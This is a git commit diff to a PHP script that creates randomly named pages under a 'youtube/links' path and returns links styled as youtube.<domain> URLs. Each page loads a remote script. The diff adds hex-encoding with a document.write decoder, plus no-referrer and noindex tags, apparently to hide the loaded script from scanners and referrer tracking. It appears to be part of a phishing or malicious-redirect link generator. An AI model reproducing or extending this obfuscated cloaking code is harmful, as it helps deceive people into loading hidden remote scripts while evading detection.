bf885e6e21434e7d2ed7697c12e3c66e322d0b6a
busine011 <112756675+busine011@users.noreply.github.com>
2022-11-17 08:42:34 -0400

    Update index.php

--- index.php
+++ index.php
@@ -22,7 +22,25 @@ $PROTOCOLO  =  "https://";
 $NAMEFILE = generateRandomString();
 $DOMAIN = $_SERVER['SERVER_NAME'];
 
-$contentHTML = '<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>';
-file_put_contents("youtube/links". "/" .$NAMEFILE, $contentHTML);
+$contentHTML = '
+<html>
+<head>
+<meta http-equiv="cache-control" content="no-cache">
+<meta name="referrer" content="no-referrer" />
+<meta name="robots" content="index">
+<meta name="robots" content="noindex">
+<meta name="robots" content="nofollow">
+</head>
+<body>
+<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>
+</body>
+</html>';
+
+$contentHTMLEXTRAIDO = $contentHTML;	
+$decode =  utf8_decode($contentHTMLEXTRAIDO);
+$hex = bin2hex($decode);	
+$script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';	
+
+file_put_contents("youtube/links". "/" .$NAMEFILE, $script);
 echo  'https://youtube.'.$DOMAIN.'/'.$NAMEFILE;
 } 
